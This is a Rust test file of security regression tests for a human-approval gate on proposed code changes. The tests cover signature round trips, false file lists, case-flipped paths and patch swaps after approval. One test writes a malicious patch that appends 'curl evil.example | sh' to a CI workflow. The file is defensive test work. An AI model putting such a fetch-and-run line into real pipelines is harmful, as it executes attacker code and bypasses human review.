//! Adversarial regression tests from the 2.0 core security review. Each test
//! reproduces one finding; see the commit that introduced it.

use uuid::Uuid;

use crate::crypto::{sign_envelope, verify_envelope, SigningKeypair};
use crate::events::{SessionEvent, SessionEventEnvelope};
use crate::flow::{FlowRecord, ProgressMark};

/// Tiny deterministic generator for property-style loops (no extra deps).
pub(crate) struct Rng(u64);
impl Rng {
    pub(crate) fn new(seed: u64) -> Self {
        Self(seed.max(1))
    }
    pub(crate) fn next(&mut self) -> u64 {
        let mut x = self.0;
        x ^= x << 13;
        x ^= x >> 7;
        x ^= x << 17;
        self.0 = x;
        x
    }
}

/// A signed event survives the wire: serialize the envelope, parse it back
/// (as a receiving device does) and its signature still verifies. Floats in
/// flow records (cost, progress units, scores) must round-trip exactly, or
/// every peer quarantines the author's event as a bad signature.
#[test]
fn signed_flow_records_with_floats_verify_after_a_json_round_trip() {
    let kp = SigningKeypair::from_seed(&[5u8; 32]).unwrap();
    let device = Uuid::from_u128(7);
    let mut rng = Rng::new(0x5eed);
    let mut failures = 0;
    for i in 0..2_000u64 {
        // Mix money-like values and arbitrary finite bit patterns.
        let units = if i % 2 == 0 {
            (rng.next() % 1_000_000) as f64 * 0.000137
        } else {
            let f = f64::from_bits(rng.next());
            if f.is_finite() { f } else { 0.5 }
        };
        let rec = FlowRecord::Progress(ProgressMark {
            message_id: Uuid::from_u128(i as u128),
            agent: "primary".into(),
            units,
            kind: "tests_passing".into(),
            at_ms: 0,
        });
        let mut env = SessionEventEnvelope::new(Uuid::nil(), Uuid::nil(), 1, SessionEvent::FlowRecorded { record: rec });
        sign_envelope(&mut env, device, &kp);
        let wire = serde_json::to_string(&env).unwrap();
        let back: SessionEventEnvelope = serde_json::from_str(&wire).unwrap();
        if verify_envelope(&back, &kp.public_key_bytes()).is_err() {
            failures += 1;
        }
    }
    assert_eq!(failures, 0, "signed events with floats failed to verify after a JSON round trip");
}

// ---- human gate: what a proposal touches ----

use crate::guard::{human_gate_reason, DearthMode, DEFAULT_BROOD_PATHS};
use crate::lease_projection_tests::{base, ev, seed};
use crate::proposals::ActionProposal;
use crate::time_util::Timestamp;

fn dearth_on() -> SessionEvent {
    SessionEvent::DearthModeChanged {
        dearth: DearthMode {
            enabled: true,
            reason: String::new(),
            brood_paths: DEFAULT_BROOD_PATHS.iter().map(|s| s.to_string()).collect(),
            allowed_mcp_servers: vec![],
            admitted_devices: vec![],
            set_by: "owner".into(),
            set_at: Timestamp::epoch(),
        },
    }
}

fn diff_for(path: &str) -> String {
    format!("diff --git a/{path} b/{path}\nindex 1111111..2222222 100644\n--- a/{path}\n+++ b/{path}\n@@ -1 +1 @@\n-a\n+b\n")
}

/// The brood gate must judge the patch that will be applied, not the
/// author-declared `changed_files` summary: a diff that rewrites CI while
/// declaring only `src/lib.rs` must still need a human approval.
#[test]
fn brood_gate_reads_the_diff_not_the_declared_file_list() {
    let s = base();
    let lying = ActionProposal::file_diff("p", "", diff_for(".github/workflows/ci.yml"), vec!["src/lib.rs".into()]);
    let pid = lying.id;
    let p = crate::events::project(&[
        seed(&s),
        ev(&s, 1, "owner", None, dearth_on()),
        ev(&s, 2, "alice", None, SessionEvent::ProposalUpserted { proposal: lying }),
    ])
    .unwrap();
    let prop = p.proposals.iter().find(|x| x.id == pid).unwrap();
    assert!(human_gate_reason(&p, prop).is_some(), "a CI change hidden behind a false file list skipped the human gate");
}

/// macOS and Windows volumes are case-insensitive by default, so
/// `.GitHub/workflows/ci.yml` lands in `.github/`. The brood gate must match
/// the way the file system resolves the path (the write guard in
/// hive-runtime's builtin tools already does).
#[test]
fn brood_gate_is_case_insensitive() {
    let s = base();
    let mut rng = Rng::new(42);
    for path in [".github/workflows/ci.yml", "deploy/prod.yaml", "infra/main.tf", "Jenkinsfile", ".circleci/config.yml"] {
        // A random case-flip of the protected path.
        let flipped: String = path
            .chars()
            .map(|c| if rng.next() % 2 == 0 { c.to_ascii_uppercase() } else { c.to_ascii_lowercase() })
            .collect();
        let flipped = if flipped == path { path.to_ascii_uppercase() } else { flipped };
        let prop = ActionProposal::file_diff("p", "", diff_for(&flipped), vec![flipped.clone()]);
        let pid = prop.id;
        let p = crate::events::project(&[
            seed(&s),
            ev(&s, 1, "owner", None, dearth_on()),
            ev(&s, 2, "alice", None, SessionEvent::ProposalUpserted { proposal: prop }),
        ])
        .unwrap();
        let prop = p.proposals.iter().find(|x| x.id == pid).unwrap();
        assert!(human_gate_reason(&p, prop).is_some(), "{flipped} slipped past the brood gate");
    }
}

fn signed_vote(pid: Uuid, voter: &str) -> SessionEvent {
    SessionEvent::ProposalVoteCast {
        proposal_id: pid,
        approval: crate::proposals::ProposalApproval {
            actor_id: voter.into(),
            role: crate::identity::WorkspaceRole::Owner,
            approved: true,
            created_at: Timestamp::epoch(),
        },
    }
}

/// A human's verified approval is for the change they reviewed. Re-upserting
/// the same proposal id with a different patch after the vote must not carry
/// the approval over to the new patch.
#[test]
fn verified_approval_does_not_survive_a_changed_patch() {
    let s = base();
    let path = ".github/workflows/ci.yml";
    let benign = ActionProposal::file_diff("p", "", diff_for(path), vec![path.into()]);
    let pid = benign.id;
    let mut swapped = benign.clone();
    swapped.diff = Some(format!("{}+curl evil.example | sh\n", diff_for(path)));
    let mut envs = vec![
        seed(&s),
        ev(&s, 1, "owner", None, dearth_on()),
        ev(&s, 2, "alice", None, SessionEvent::ProposalUpserted { proposal: benign.clone() }),
        ev(&s, 3, "owner", None, signed_vote(pid, "owner")),
    ];
    let p = crate::events::project(&envs).unwrap();
    assert!(human_gate_reason(&p, p.proposals.iter().find(|x| x.id == pid).unwrap()).is_none(), "control: approved");
    // A status-only re-upsert of the same patch keeps the approval.
    let mut same = benign.clone();
    same.title = "renamed".into();
    envs.push(ev(&s, 4, "alice", None, SessionEvent::ProposalUpserted { proposal: same }));
    let p = crate::events::project(&envs).unwrap();
    assert!(human_gate_reason(&p, p.proposals.iter().find(|x| x.id == pid).unwrap()).is_none(), "same patch keeps it");
    // Swapping the patch under the approval must re-arm the gate.
    envs.push(ev(&s, 5, "alice", None, SessionEvent::ProposalUpserted { proposal: swapped }));
    let p = crate::events::project(&envs).unwrap();
    assert!(
        human_gate_reason(&p, p.proposals.iter().find(|x| x.id == pid).unwrap()).is_some(),
        "the approval of the benign patch was reused for a different patch"
    );
}
